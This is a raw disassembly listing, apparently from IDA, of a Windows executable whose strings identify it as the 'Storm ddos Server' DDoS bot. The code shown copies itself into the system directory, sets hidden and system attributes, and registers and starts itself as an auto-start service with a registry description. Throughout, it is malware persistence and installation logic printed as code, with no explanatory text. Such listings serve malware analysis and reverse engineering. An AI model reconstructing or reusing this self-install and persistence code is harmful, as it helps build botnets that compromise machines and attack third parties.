.ax:00401CB0                 sub     esp, 330h
.ax:00401CB6                 push    ebp
.ax:00401CB7                 push    esi
.ax:00401CB8                 mov     esi, ds:MessageBoxA ; USER32
.ax:00401CBE                 push    edi
.ax:00401CBF                 push    0               ; uType
.ax:00401CC1                 push    offset Caption  ; "123"
.ax:00401CC6                 push    offset Caption  ; "123"
.ax:00401CCB                 push    0               ; hWnd
.ax:00401CCD                 call    esi ; MessageBoxA ; USER32
.ax:00401CCF                 mov     eax, dword_404120
.ax:00401CD4                 cmp     eax, 1
.ax:00401CD7                 jnz     loc_401EFE
.ax:00401CDD                 mov     ecx, 40h ; '@'
.ax:00401CE2                 xor     eax, eax
.ax:00401CE4                 lea     edi, [esp+33Ch+var_30B]
.ax:00401CE8                 mov     [esp+33Ch+Data], 0
.ax:00401CED                 rep stosd
.ax:00401CEF                 stosw
.ax:00401CF1                 stosb
.ax:00401CF2                 lea     eax, [esp+33Ch+phkResult]
.ax:00401CF6                 push    eax             ; phkResult
.ax:00401CF7                 push    0F003Fh         ; samDesired
.ax:00401CFC                 push    0               ; ulOptions
.ax:00401CFE                 push    offset SubKey   ; "SYSTEM\\CurrentControlSet\\Services\\La"...
.ax:00401D03                 push    80000002h       ; hKey
.ax:00401D08                 call    ds:RegOpenKeyExA ; ADVAPI32
.ax:00401D0E                 test    eax, eax
.ax:00401D10                 jnz     short loc_401D46
.ax:00401D12                 lea     ecx, [esp+33Ch+cbData]
.ax:00401D16                 lea     edx, [esp+33Ch+Data]
.ax:00401D1A                 push    ecx             ; lpcbData
.ax:00401D1B                 mov     ecx, [esp+340h+phkResult]
.ax:00401D1F                 lea     eax, [esp+340h+Type]
.ax:00401D23                 push    edx             ; lpData
.ax:00401D24                 push    eax             ; lpType
.ax:00401D25                 push    0               ; lpReserved
.ax:00401D27                 push    offset ValueName ; "ServiceDLL"
.ax:00401D2C                 push    ecx             ; hKey
.ax:00401D2D                 mov     [esp+354h+cbData], 0C8h
.ax:00401D35                 call    ds:RegQueryValueExA ; ADVAPI32
.ax:00401D3B                 mov     edx, [esp+33Ch+phkResult]
.ax:00401D3F                 push    edx             ; hKey
.ax:00401D40                 call    ds:RegCloseKey  ; ADVAPI32
.ax:00401D46
.ax:00401D46 loc_401D46:                             ; CODE XREF: WinMain(x,x,x,x)+60↑j
.ax:00401D46                 push    offset aSystemrootSyst ; "%SystemRoot%\\System32\\"
.ax:00401D4B                 lea     ecx, [esp+340h+var_32C] ; this
.ax:00401D4F                 call    ??0CString@@QAE@PBD@Z ; CString::CString(char const *)
.ax:00401D54                 lea     eax, [esp+33Ch+var_32C]
.ax:00401D58                 push    offset aStormserverDll ; "StormServer.dll"
.ax:00401D5D                 lea     ecx, [esp+340h+cbData]
.ax:00401D61                 push    eax
.ax:00401D62                 push    ecx
.ax:00401D63                 call    ??H@YG?AVCString@@ABV0@PBD@Z ; operator+(CString const &,char const *)
.ax:00401D68                 mov     esi, [eax]
.ax:00401D6A                 lea     ecx, [esp+33Ch+Data]
.ax:00401D6E
.ax:00401D6E loc_401D6E:                             ; CODE XREF: WinMain(x,x,x,x)+DC↓j
.ax:00401D6E                 mov     dl, [ecx]
.ax:00401D70                 mov     al, dl
.ax:00401D72                 cmp     dl, [esi]
.ax:00401D74                 jnz     short loc_401D92
.ax:00401D76                 test    al, al
.ax:00401D78                 jz      short loc_401D8E
.ax:00401D7A                 mov     dl, [ecx+1]
.ax:00401D7D                 mov     al, dl
.ax:00401D7F                 cmp     dl, [esi+1]
.ax:00401D82                 jnz     short loc_401D92
.ax:00401D84                 add     ecx, 2
.ax:00401D87                 add     esi, 2
.ax:00401D8A                 test    al, al
.ax:00401D8C                 jnz     short loc_401D6E
.ax:00401D8E
.ax:00401D8E loc_401D8E:                             ; CODE XREF: WinMain(x,x,x,x)+C8↑j
.ax:00401D8E                 xor     esi, esi
.ax:00401D90                 jmp     short loc_401D97
.ax:00401D92 ; ---------------------------------------------------------------------------
.ax:00401D92
.ax:00401D92 loc_401D92:                             ; CODE XREF: WinMain(x,x,x,x)+C4↑j
.ax:00401D92                                         ; WinMain(x,x,x,x)+D2↑j
.ax:00401D92                 sbb     esi, esi
.ax:00401D94                 sbb     esi, 0FFFFFFFFh
.ax:00401D97
.ax:00401D97 loc_401D97:                             ; CODE XREF: WinMain(x,x,x,x)+E0↑j
.ax:00401D97                 lea     ecx, [esp+33Ch+cbData] ; this
.ax:00401D9B                 call    ??1CString@@QAE@XZ ; CString::~CString(void)
.ax:00401DA0                 test    esi, esi
.ax:00401DA2                 jnz     short loc_401DAB
.ax:00401DA4                 push    esi             ; Code
.ax:00401DA5                 call    ds:exit         ; MSVCRT
.ax:00401DAB ; ---------------------------------------------------------------------------
.ax:00401DAB
.ax:00401DAB loc_401DAB:                             ; CODE XREF: WinMain(x,x,x,x)+F2↑j
.ax:00401DAB                 mov     ebp, ds:GetSystemDirectoryA ; KERNEL32
.ax:00401DB1                 lea     eax, [esp+33Ch+Buffer]
.ax:00401DB8                 push    104h            ; uSize
.ax:00401DBD                 push    eax             ; lpBuffer
.ax:00401DBE                 call    ebp ; GetSystemDirectoryA ; KERNEL32
.ax:00401DC0                 mov     edi, offset asc_4042CC ; "\\"
.ax:00401DC5                 or      ecx, 0FFFFFFFFh
.ax:00401DC8                 xor     eax, eax
.ax:00401DCA                 lea     edx, [esp+33Ch+Buffer]
.ax:00401DD1                 repne scasb
.ax:00401DD3                 not     ecx
.ax:00401DD5                 sub     edi, ecx
.ax:00401DD7                 mov     esi, edi
.ax:00401DD9                 mov     edi, edx
.ax:00401DDB                 mov     edx, ecx
.ax:00401DDD                 or      ecx, 0FFFFFFFFh
.ax:00401DE0                 repne scasb
.ax:00401DE2                 mov     ecx, edx
.ax:00401DE4                 dec     edi
.ax:00401DE5                 shr     ecx, 2
.ax:00401DE8                 rep movsd
.ax:00401DEA                 mov     ecx, edx
.ax:00401DEC                 lea     edx, [esp+33Ch+Buffer]
.ax:00401DF3                 and     ecx, 3
.ax:00401DF6                 rep movsb
.ax:00401DF8                 mov     edi, offset aStormserverDll ; "StormServer.dll"
.ax:00401DFD                 or      ecx, 0FFFFFFFFh
.ax:00401E00                 repne scasb
.ax:00401E02                 not     ecx
.ax:00401E04                 sub     edi, ecx
.ax:00401E06                 mov     esi, edi
.ax:00401E08                 mov     edi, edx
.ax:00401E0A                 mov     edx, ecx
.ax:00401E0C                 or      ecx, 0FFFFFFFFh
.ax:00401E0F                 repne scasb
.ax:00401E11                 mov     ecx, edx
.ax:00401E13                 dec     edi
.ax:00401E14                 shr     ecx, 2
.ax:00401E17                 rep movsd
.ax:00401E19                 mov     ecx, edx
.ax:00401E1B                 and     ecx, 3
.ax:00401E1E                 rep movsb
.ax:00401E20                 push    ecx             ; lpType
.ax:00401E21                 mov     ecx, esp        ; this
.ax:00401E23                 mov     [esp+340h+Type], esp
.ax:00401E27                 push    offset aDll     ; "DLL"
.ax:00401E2C                 call    ??0CString@@QAE@PBD@Z ; CString::CString(char const *)
.ax:00401E31                 push    65h ; 'e'       ; int
.ax:00401E33                 push    ecx             ; char
.ax:00401E34                 lea     eax, [esp+348h+Buffer]
.ax:00401E3B                 mov     ecx, esp        ; this
.ax:00401E3D                 mov     [esp+348h+Type], esp
.ax:00401E41                 push    eax             ; char *
.ax:00401E42                 call    ??0CString@@QAE@PBD@Z ; CString::CString(char const *)
.ax:00401E47                 call    sub_402460
.ax:00401E4C                 add     esp, 0Ch
.ax:00401E4F                 test    al, al
.ax:00401E51                 jnz     short loc_401E6A
.ax:00401E53                 lea     ecx, [esp+33Ch+var_32C] ; this
.ax:00401E57                 call    ??1CString@@QAE@XZ ; CString::~CString(void)
.ax:00401E5C                 xor     eax, eax
.ax:00401E5E                 pop     edi
.ax:00401E5F                 pop     esi
.ax:00401E60                 pop     ebp
.ax:00401E61                 add     esp, 330h
.ax:00401E67                 retn    10h
.ax:00401E6A ; ---------------------------------------------------------------------------
.ax:00401E6A
.ax:00401E6A loc_401E6A:                             ; CODE XREF: WinMain(x,x,x,x)+1A1↑j
.ax:00401E6A                 call    sub_401260
.ax:00401E6F                 lea     ecx, [esp+33Ch+var_104]
.ax:00401E76                 push    104h            ; uSize
.ax:00401E7B                 push    ecx             ; lpBuffer
.ax:00401E7C                 call    ebp ; GetSystemDirectoryA ; KERNEL32
.ax:00401E7E                 lea     edx, [esp+33Ch+var_104]
.ax:00401E85                 lea     ecx, [esp+33Ch+lpString] ; this
.ax:00401E89                 push    edx             ; char *
.ax:00401E8A                 call    ??0CString@@QAE@PBD@Z ; CString::CString(char const *)
.ax:00401E8F                 push    offset asc_4042CC ; "\\"
.ax:00401E94                 lea     ecx, [esp+340h+lpString]
.ax:00401E98                 call    ??YCString@@QAEABV0@PBD@Z ; CString::operator+=(char const *)
.ax:00401E9D                 push    offset aStormserverDll ; "StormServer.dll"
.ax:00401EA2                 lea     ecx, [esp+340h+lpString]
.ax:00401EA6                 call    ??YCString@@QAEABV0@PBD@Z ; CString::operator+=(char const *)
.ax:00401EAB                 mov     eax, [esp+33Ch+lpString]
.ax:00401EAF                 push    eax             ; lpString
.ax:00401EB0                 call    sub_401150
.ax:00401EB5                 add     esp, 4
.ax:00401EB8                 test    eax, eax
.ax:00401EBA                 jnz     short loc_401EDC
.ax:00401EBC                 lea     ecx, [esp+33Ch+lpString] ; this
.ax:00401EC0                 call    ??1CString@@QAE@XZ ; CString::~CString(void)
.ax:00401EC5                 lea     ecx, [esp+33Ch+var_32C] ; this
.ax:00401EC9                 call    ??1CString@@QAE@XZ ; CString::~CString(void)
.ax:00401ECE                 xor     eax, eax
.ax:00401ED0                 pop     edi
.ax:00401ED1                 pop     esi
.ax:00401ED2                 pop     ebp
.ax:00401ED3                 add     esp, 330h
.ax:00401ED9                 retn    10h
.ax:00401EDC ; ---------------------------------------------------------------------------
.ax:00401EDC
.ax:00401EDC loc_401EDC:                             ; CODE XREF: WinMain(x,x,x,x)+20A↑j
.ax:00401EDC                 call    sub_401390
.ax:00401EE1                 lea     ecx, [esp+33Ch+lpString] ; this
.ax:00401EE5                 call    ??1CString@@QAE@XZ ; CString::~CString(void)
.ax:00401EEA                 lea     ecx, [esp+33Ch+var_32C] ; this
.ax:00401EEE                 call    ??1CString@@QAE@XZ ; CString::~CString(void)
.ax:00401EF3                 mov     eax, dword_404120
.ax:00401EF8                 mov     esi, ds:MessageBoxA ; USER32
.ax:00401EFE
.ax:00401EFE loc_401EFE:                             ; CODE XREF: WinMain(x,x,x,x)+27↑j
.ax:00401EFE                 cmp     eax, 2
.ax:00401F01                 jnz     short loc_401F75
.ax:00401F03                 call    sub_402320
.ax:00401F08                 test    eax, eax
.ax:00401F0A                 jz      short loc_401F48
.ax:00401F0C                 lea     ecx, [esp+33Ch+ServiceStartTable]
.ax:00401F10                 mov     [esp+33Ch+ServiceStartTable.lpServiceName], offset ServiceName ; "Storm ddos Server"
.ax:00401F18                 push    ecx             ; lpServiceStartTable
.ax:00401F19                 mov     [esp+340h+ServiceStartTable.lpServiceProc], offset sub_401510
.ax:00401F21                 mov     [esp+340h+var_314], 0
.ax:00401F29                 mov     [esp+340h+var_310], 0
.ax:00401F31                 call    ds:StartServiceCtrlDispatcherA ; ADVAPI32
.ax:00401F37                 mov     eax, 1
.ax:00401F3C                 pop     edi
.ax:00401F3D                 pop     esi
.ax:00401F3E                 pop     ebp
.ax:00401F3F                 add     esp, 330h
.ax:00401F45                 retn    10h
.ax:00401F48 ; ---------------------------------------------------------------------------
.ax:00401F48
.ax:00401F48 loc_401F48:                             ; CODE XREF: WinMain(x,x,x,x)+25A↑j
.ax:00401F48                 push    offset String   ; "Thank you"
.ax:00401F4D                 push    offset DisplayName ; "Welcome to use storm ddos"
.ax:00401F52                 push    offset ServiceName ; "Storm ddos Server"
.ax:00401F57                 call    sub_401FD0
.ax:00401F5C                 mov     eax, dword_4044AC
.ax:00401F61                 add     esp, 0Ch
.ax:00401F64                 test    eax, eax
.ax:00401F66                 jz      short loc_401FBF
.ax:00401F68                 call    sub_401390
.ax:00401F6D                 push    0               ; Code
.ax:00401F6F                 call    ds:exit         ; MSVCRT
.ax:00401F75 ; ---------------------------------------------------------------------------
.ax:00401F75
.ax:00401F75 loc_401F75:                             ; CODE XREF: WinMain(x,x,x,x)+251↑j
.ax:00401F75                 cmp     eax, 3
.ax:00401F78                 jnz     short loc_401FA5
.ax:00401F7A                 push    0               ; uType
.ax:00401F7C                 push    offset Text     ; lpCaption
.ax:00401F81                 push    offset Text     ; lpText
.ax:00401F86                 push    0               ; hWnd
.ax:00401F88                 call    esi ; MessageBoxA ; USER32
.ax:00401F8A                 call    sub_401900
.ax:00401F8F                 call    sub_401390
.ax:00401F94                 mov     eax, 1
.ax:00401F99                 pop     edi
.ax:00401F9A                 pop     esi
.ax:00401F9B                 pop     ebp
.ax:00401F9C                 add     esp, 330h
.ax:00401FA2                 retn    10h
.ax:00401FA5 ; ---------------------------------------------------------------------------
.ax:00401FA5
.ax:00401FA5 loc_401FA5:                             ; CODE XREF: WinMain(x,x,x,x)+2C8↑j
.ax:00401FA5                 cmp     eax, 4
.ax:00401FA8                 jnz     short loc_401FBF
.ax:00401FAA                 push    0               ; uType
.ax:00401FAC                 push    offset Text     ; lpCaption
.ax:00401FB1                 push    offset Text     ; lpText
.ax:00401FB6                 push    0               ; hWnd
.ax:00401FB8                 call    esi ; MessageBoxA ; USER32
.ax:00401FBA                 call    sub_401B90
.ax:00401FBF
.ax:00401FBF loc_401FBF:                             ; CODE XREF: WinMain(x,x,x,x)+2B6↑j
.ax:00401FBF                                         ; WinMain(x,x,x,x)+2F8↑j
.ax:00401FBF                 pop     edi
.ax:00401FC0                 pop     esi
.ax:00401FC1                 mov     eax, 1
.ax:00401FC6                 pop     ebp
.ax:00401FC7                 add     esp, 330h
.ax:00401FCD                 retn    10h
.ax:00401FCD _WinMain@16     endp
.ax:00401FCD
.ax:00401FD0
.ax:00401FD0 ; =============== S U B R O U T I N E =======================================
.ax:00401FD0
.ax:00401FD0 ; Attributes: bp-based frame
.ax:00401FD0
.ax:00401FD0 ; HKEY __cdecl sub_401FD0(LPCSTR lpServiceName, LPCSTR lpDisplayName, LPCSTR lpString)
.ax:00401FD0 sub_401FD0      proc near               ; CODE XREF: WinMain(x,x,x,x)+2A7↑p
.ax:00401FD0
.ax:00401FD0 Buf             = byte ptr -380h
.ax:00401FD0 var_330         = dword ptr -330h
.ax:00401FD0 var_32C         = dword ptr -32Ch
.ax:00401FD0 Filename        = byte ptr -328h
.ax:00401FD0 phkResult       = dword ptr -224h
.ax:00401FD0 Str1            = byte ptr -220h
.ax:00401FD0 SubKey          = byte ptr -11Ch
.ax:00401FD0 ms_exc          = CPPEH_RECORD ptr -18h
.ax:00401FD0 lpServiceName   = dword ptr  8
.ax:00401FD0 lpDisplayName   = dword ptr  0Ch
.ax:00401FD0 lpString        = dword ptr  10h
.ax:00401FD0
.ax:00401FD0 ; __unwind { // _except_handler3
.ax:00401FD0                 push    ebp
.ax:00401FD1                 mov     ebp, esp
.ax:00401FD3                 push    0FFFFFFFFh
.ax:00401FD5                 push    offset stru_403188
.ax:00401FDA                 push    offset _except_handler3
.ax:00401FDF                 mov     eax, large fs:0
.ax:00401FE5                 push    eax
.ax:00401FE6                 mov     large fs:0, esp
.ax:00401FED                 sub     esp, 370h
.ax:00401FF3                 push    ebx
.ax:00401FF4                 push    esi
.ax:00401FF5                 push    edi
.ax:00401FF6                 push    104h            ; nSize
.ax:00401FFB                 lea     eax, [ebp+Filename]
.ax:00402001                 push    eax             ; lpFilename
.ax:00402002                 xor     ebx, ebx
.ax:00402004                 push    ebx             ; hModule
.ax:00402005                 call    ds:GetModuleFileNameA ; KERNEL32
.ax:0040200B                 mov     cl, byte_404124
.ax:00402011                 push    ecx             ; char
.ax:00402012                 lea     edx, [ebp+Str1]
.ax:00402018                 push    edx             ; lpBuffer
.ax:00402019                 call    sub_401000
.ax:0040201E                 lea     edi, [ebp+Str1]
.ax:00402024                 or      ecx, 0FFFFFFFFh
.ax:00402027                 xor     eax, eax
.ax:00402029                 repne scasb
.ax:0040202B                 not     ecx
.ax:0040202D                 dec     ecx
.ax:0040202E                 push    ecx             ; MaxCount
.ax:0040202F                 lea     eax, [ebp+Filename]
.ax:00402035                 push    eax             ; Str2
.ax:00402036                 lea     ecx, [ebp+Str1]
.ax:0040203C                 push    ecx             ; Str1
.ax:0040203D                 call    ds:strncmp      ; MSVCRT
.ax:00402043                 add     esp, 14h
.ax:00402046                 test    eax, eax
.ax:00402048                 jz      loc_402178
.ax:0040204E                 push    50h ; 'P'       ; cchSize
.ax:00402050                 lea     edx, [ebp+Buf]
.ax:00402056                 push    edx             ; Buf
.ax:00402057                 lea     eax, [ebp+Filename]
.ax:0040205D                 push    eax             ; LPCSTR
.ax:0040205E                 call    ds:GetFileTitleA ; comdlg32
.ax:00402064                 push    offset SubStr   ; ".exe"
.ax:00402069                 lea     ecx, [ebp+Buf]
.ax:0040206F                 push    ecx             ; Str
.ax:00402070                 mov     esi, ds:strstr  ; MSVCRT
.ax:00402076                 call    esi ; strstr    ; MSVCRT
.ax:00402078                 add     esp, 8
.ax:0040207B                 test    eax, eax
.ax:0040207D                 jnz     short loc_4020C2
.ax:0040207F                 push    offset aExe_0   ; ".EXE"
.ax:00402084                 lea     edx, [ebp+Buf]
.ax:0040208A                 push    edx             ; Str
.ax:0040208B                 call    esi ; strstr    ; MSVCRT
.ax:0040208D                 add     esp, 8
.ax:00402090                 test    eax, eax
.ax:00402092                 jnz     short loc_4020C2
.ax:00402094                 lea     edx, [ebp+Buf]
.ax:0040209A                 mov     edi, offset SubStr ; ".exe"
.ax:0040209F                 or      ecx, 0FFFFFFFFh
.ax:004020A2                 repne scasb
.ax:004020A4                 not     ecx
.ax:004020A6                 sub     edi, ecx
.ax:004020A8                 mov     esi, edi
.ax:004020AA                 mov     ebx, ecx
.ax:004020AC                 mov     edi, edx
.ax:004020AE                 or      ecx, 0FFFFFFFFh
.ax:004020B1                 repne scasb
.ax:004020B3                 dec     edi
.ax:004020B4                 mov     ecx, ebx
.ax:004020B6                 shr     ecx, 2
.ax:004020B9                 rep movsd
.ax:004020BB                 mov     ecx, ebx
.ax:004020BD                 and     ecx, 3
.ax:004020C0                 rep movsb
.ax:004020C2
.ax:004020C2 loc_4020C2:                             ; CODE XREF: sub_401FD0+AD↑j
.ax:004020C2                                         ; sub_401FD0+C2↑j
.ax:004020C2                 lea     edx, [ebp+Str1]
.ax:004020C8                 mov     edi, offset asc_4042CC ; "\\"
.ax:004020CD                 or      ecx, 0FFFFFFFFh
.ax:004020D0                 xor     eax, eax
.ax:004020D2                 repne scasb
.ax:004020D4                 not     ecx
.ax:004020D6                 sub     edi, ecx
.ax:004020D8                 mov     esi, edi
.ax:004020DA                 mov     ebx, ecx
.ax:004020DC                 mov     edi, edx
.ax:004020DE                 or      ecx, 0FFFFFFFFh
.ax:004020E1                 repne scasb
.ax:004020E3                 dec     edi
.ax:004020E4                 mov     ecx, ebx
.ax:004020E6                 shr     ecx, 2
.ax:004020E9                 rep movsd
.ax:004020EB                 mov     ecx, ebx
.ax:004020ED                 and     ecx, 3
.ax:004020F0                 rep movsb
.ax:004020F2                 lea     edi, [ebp+Buf]
.ax:004020F8                 lea     edx, [ebp+Str1]
.ax:004020FE                 or      ecx, 0FFFFFFFFh
.ax:00402101                 repne scasb
.ax:00402103                 not     ecx
.ax:00402105                 sub     edi, ecx
.ax:00402107                 mov     esi, edi
.ax:00402109                 mov     ebx, ecx
.ax:0040210B                 mov     edi, edx
.ax:0040210D                 or      ecx, 0FFFFFFFFh
.ax:00402110                 repne scasb
.ax:00402112                 dec     edi
.ax:00402113                 mov     ecx, ebx
.ax:00402115                 shr     ecx, 2
.ax:00402118                 rep movsd
.ax:0040211A                 mov     ecx, ebx
.ax:0040211C                 and     ecx, 3
.ax:0040211F                 rep movsb
.ax:00402121                 push    eax             ; bFailIfExists
.ax:00402122                 lea     eax, [ebp+Str1]
.ax:00402128                 push    eax             ; lpNewFileName
.ax:00402129                 lea     ecx, [ebp+Filename]
.ax:0040212F                 push    ecx             ; lpExistingFileName
.ax:00402130                 call    ds:CopyFileA    ; KERNEL32
.ax:00402136                 mov     ecx, 41h ; 'A'
.ax:0040213B                 xor     eax, eax
.ax:0040213D                 lea     edi, [ebp+Filename]
.ax:00402143                 rep stosd
.ax:00402145                 lea     edi, [ebp+Str1]
.ax:0040214B                 lea     edx, [ebp+Filename]
.ax:00402151                 or      ecx, 0FFFFFFFFh
.ax:00402154                 repne scasb
.ax:00402156                 not     ecx
.ax:00402158                 sub     edi, ecx
.ax:0040215A                 mov     eax, ecx
.ax:0040215C                 mov     esi, edi
.ax:0040215E                 mov     edi, edx
.ax:00402160                 shr     ecx, 2
.ax:00402163                 rep movsd
.ax:00402165                 mov     ecx, eax
.ax:00402167                 and     ecx, 3
.ax:0040216A                 rep movsb
.ax:0040216C                 mov     dword_4044AC, 1
.ax:00402176                 xor     ebx, ebx
.ax:00402178
.ax:00402178 loc_402178:                             ; CODE XREF: sub_401FD0+78↑j
.ax:00402178                 push    6               ; dwFileAttributes
.ax:0040217A                 lea     ecx, [ebp+Filename]
.ax:00402180                 push    ecx             ; lpFileName
.ax:00402181                 call    ds:SetFileAttributesA ; KERNEL32
.ax:00402187                 mov     [ebp+phkResult], ebx
.ax:0040218D                 mov     [ebp+var_330], ebx
.ax:00402193                 mov     [ebp+var_32C], ebx
.ax:00402199 ;   __try { // __finally(loc_4022EC)
.ax:00402199                 mov     [ebp+ms_exc.registration.TryLevel], ebx
.ax:0040219C                 push    0F003Fh         ; dwDesiredAccess
.ax:004021A1                 push    ebx             ; lpDatabaseName
.ax:004021A2                 push    ebx             ; lpMachineName
.ax:004021A3                 call    ds:OpenSCManagerA ; ADVAPI32
.ax:004021A9                 mov     esi, eax
.ax:004021AB                 mov     [ebp+var_32C], esi
.ax:004021B1                 test    esi, esi
.ax:004021B3                 jz      loc_4022CF
.ax:004021B9                 push    0               ; lpPassword
.ax:004021BB                 push    0               ; lpServiceStartName
.ax:004021BD                 push    0               ; lpDependencies
.ax:004021BF                 push    0               ; lpdwTagId
.ax:004021C1                 push    0               ; lpLoadOrderGroup
.ax:004021C3                 lea     edx, [ebp+Filename]
.ax:004021C9                 push    edx             ; lpBinaryPathName
.ax:004021CA                 push    0               ; dwErrorControl
.ax:004021CC                 push    2               ; dwStartType
.ax:004021CE                 push    10h             ; dwServiceType
.ax:004021D0                 push    0F01FFh         ; dwDesiredAccess
.ax:004021D5                 mov     eax, [ebp+lpDisplayName]
.ax:004021D8                 push    eax             ; lpDisplayName
.ax:004021D9                 mov     edi, [ebp+lpServiceName]
.ax:004021DC                 push    edi             ; lpServiceName
.ax:004021DD                 push    esi             ; hSCManager
.ax:004021DE                 call    ds:CreateServiceA ; ADVAPI32
.ax:004021E4                 mov     ebx, eax
.ax:004021E6                 mov     [ebp+var_330], ebx
.ax:004021EC                 test    ebx, ebx
.ax:004021EE                 jnz     short loc_402225
.ax:004021F0                 call    ds:GetLastError ; KERNEL32
.ax:004021F6                 cmp     eax, 431h
.ax:004021FB                 jnz     short loc_402225
.ax:004021FD                 push    0F01FFh         ; dwDesiredAccess
.ax:00402202                 push    edi             ; lpServiceName
.ax:00402203                 push    esi             ; hSCManager
.ax:00402204                 call    ds:OpenServiceA ; ADVAPI32
.ax:0040220A                 mov     ebx, eax
.ax:0040220C                 mov     [ebp+var_330], ebx
.ax:00402212                 test    ebx, ebx
.ax:00402214                 jz      loc_4022CF
.ax:0040221A                 push    0               ; lpServiceArgVectors
.ax:0040221C                 push    0               ; dwNumServiceArgs
.ax:0040221E                 push    ebx             ; hService
.ax:0040221F                 call    ds:StartServiceA ; ADVAPI32
.ax:00402225
.ax:00402225 loc_402225:                             ; CODE XREF: sub_401FD0+21E↑j
.ax:00402225                                         ; sub_401FD0+22B↑j
.ax:00402225                 push    0               ; lpServiceArgVectors
.ax:00402227                 push    0               ; dwNumServiceArgs
.ax:00402229                 push    ebx             ; hService
.ax:0040222A                 call    ds:StartServiceA ; ADVAPI32
.ax:00402230                 test    eax, eax
.ax:00402232                 jz      loc_4022CF
.ax:00402238                 lea     edx, [ebp+SubKey]
.ax:0040223E                 mov     edi, offset aSystemCurrentc_0 ; "SYSTEM\\CurrentControlSet\\Services\\"
.ax:00402243                 or      ecx, 0FFFFFFFFh
.ax:00402246                 xor     eax, eax
.ax:00402248                 repne scasb
.ax:0040224A                 not     ecx
.ax:0040224C                 sub     edi, ecx
.ax:0040224E                 mov     eax, ecx
.ax:00402250                 mov     esi, edi
.ax:00402252                 mov     edi, edx
.ax:00402254                 shr     ecx, 2
.ax:00402257                 rep movsd
.ax:00402259                 mov     ecx, eax
.ax:0040225B                 and     ecx, 3
.ax:0040225E                 rep movsb
.ax:00402260                 lea     edx, [ebp+SubKey]
.ax:00402266                 mov     edi, [ebp+lpServiceName]
.ax:00402269                 or      ecx, 0FFFFFFFFh
.ax:0040226C                 xor     eax, eax
.ax:0040226E                 repne scasb
.ax:00402270                 not     ecx
.ax:00402272                 sub     edi, ecx
.ax:00402274                 mov     esi, edi
.ax:00402276                 mov     edi, edx
.ax:00402278                 mov     edx, ecx
.ax:0040227A                 or      ecx, 0FFFFFFFFh
.ax:0040227D                 repne scasb
.ax:0040227F                 dec     edi
.ax:00402280                 mov     ecx, edx
.ax:00402282                 shr     ecx, 2
.ax:00402285                 rep movsd
.ax:00402287                 mov     ecx, edx
.ax:00402289                 and     ecx, 3
.ax:0040228C                 rep movsb
.ax:0040228E                 lea     eax, [ebp+phkResult]
.ax:00402294                 push    eax             ; phkResult
.ax:00402295                 lea     ecx, [ebp+SubKey]
.ax:0040229B                 push    ecx             ; lpSubKey
.ax:0040229C                 push    80000002h       ; hKey
.ax:004022A1                 call    ds:RegOpenKeyA  ; ADVAPI32
.ax:004022A7                 mov     esi, [ebp+lpString]
.ax:004022AA                 push    esi             ; lpString
.ax:004022AB                 call    ds:lstrlenA     ; KERNEL32
.ax:004022B1                 push    eax             ; cbData
.ax:004022B2                 push    esi             ; lpData
.ax:004022B3                 push    1               ; dwType
.ax:004022B5                 push    0               ; Reserved
.ax:004022B7                 push    offset aDescription ; "Description"
.ax:004022BC                 mov     edx, [ebp+phkResult]
.ax:004022C2                 push    edx             ; hKey
.ax:004022C3                 call    ds:RegSetValueExA ; ADVAPI32
.ax:004022C9                 mov     esi, [ebp+var_32C]
.ax:004022C9 ;   } // starts at 402199
.ax:004022CF
.ax:004022CF loc_4022CF:                             ; CODE XREF: sub_401FD0+1E3↑j
.ax:004022CF                                         ; sub_401FD0+244↑j ...
.ax:004022CF                 mov     [ebp+ms_exc.registration.TryLevel], 0FFFFFFFFh
.ax:004022D6                 call    loc_4022F8
.ax:004022DB ; ---------------------------------------------------------------------------
.ax:004022DB
.ax:004022DB loc_4022DB:                             ; CODE XREF: sub_401FD0:loc_40231F↓j
.ax:004022DB                 mov     ecx, [ebp+ms_exc.registration.Next]
.ax:004022DE                 mov     large fs:0, ecx
.ax:004022E5                 pop     edi
.ax:004022E6                 pop     esi
.ax:004022E7                 pop     ebx
.ax:004022E8                 mov     esp, ebp
.ax:004022EA                 pop     ebp
.ax:004022EB                 retn
.ax:004022EC ; ---------------------------------------------------------------------------
.ax:004022EC
.ax:004022EC loc_4022EC:                             ; DATA XREF: .rdata:stru_403188↓o
.ax:004022EC ;   __finally // owned by 402199
.ax:004022EC                 mov     ebx, [ebp+var_330]
.ax:004022F2                 mov     esi, [ebp+var_32C]
.ax:004022F8
.ax:004022F8 loc_4022F8:                             ; CODE XREF: sub_401FD0+306↑j
.ax:004022F8                 test    ebx, ebx
.ax:004022FA                 jz      short loc_402303
.ax:004022FC                 push    ebx             ; hSCObject
.ax:004022FD                 call    ds:CloseServiceHandle ; ADVAPI32
.ax:00402303
.ax:00402303 loc_402303:                             ; CODE XREF: sub_401FD0+32A↑j
.ax:00402303                 test    esi, esi
.ax:00402305                 jz      short loc_40230E
.ax:00402307                 push    esi             ; hSCObject
.ax:00402308                 call    ds:CloseServiceHandle ; ADVAPI32
.ax:0040230E
.ax:0040230E loc_40230E:                             ; CODE XREF: sub_401FD0+335↑j
.ax:0040230E                 mov     eax, [ebp+phkResult]
.ax:00402314                 test    eax, eax
.ax:00402316                 jz      short loc_40231F
.ax:00402318                 push    eax             ; hKey
.ax:00402319                 call    ds:RegCloseKey  ; ADVAPI32
.ax:0040231F
.ax:0040231F loc_40231F:                             ; CODE XREF: sub_401FD0+346↑j
.ax:0040231F                 retn
.ax:0040231F ; } // starts at 401FD0
.ax:0040231F sub_401FD0      endp
.ax:0040231F
.ax:00402320
.ax:00402320 ; =============== S U B R O U T I N E =======================================
.ax:00402320
.ax:00402320
.ax:00402320 ; BOOL sub_402320()
.ax:00402320 sub_402320      proc near               ; CODE XREF: WinMain(x,x,x,x)+253↑p
.ax:00402320
.ax:00402320 phkResult       = dword ptr -108h
.ax:00402320 SubKey          = byte ptr -104h
.ax:00402320 var_103         = byte ptr -103h
.ax:00402320
.ax:00402320                 sub     esp, 108h
.ax:00402326                 push    ebx
.ax:00402327                 push    esi
.ax:00402328                 push    edi
.ax:00402329                 mov     ecx, 40h ; '@'
.ax:0040232E                 xor     eax, eax
.ax:00402330                 lea     edi, [esp+114h+var_103]
.ax:00402334                 mov     [esp+114h+SubKey], 0
.ax:00402339                 lea     edx, [esp+114h+SubKey]
.ax:0040233D                 rep stosd
.ax:0040233F                 stosw
.ax:00402341                 stosb
.ax:00402342                 mov     edi, offset aSystemCurrentc_0 ; "SYSTEM\\CurrentControlSet\\Services\\"
.ax:00402347                 or      ecx, 0FFFFFFFFh
.ax:0040234A                 xor     eax, eax
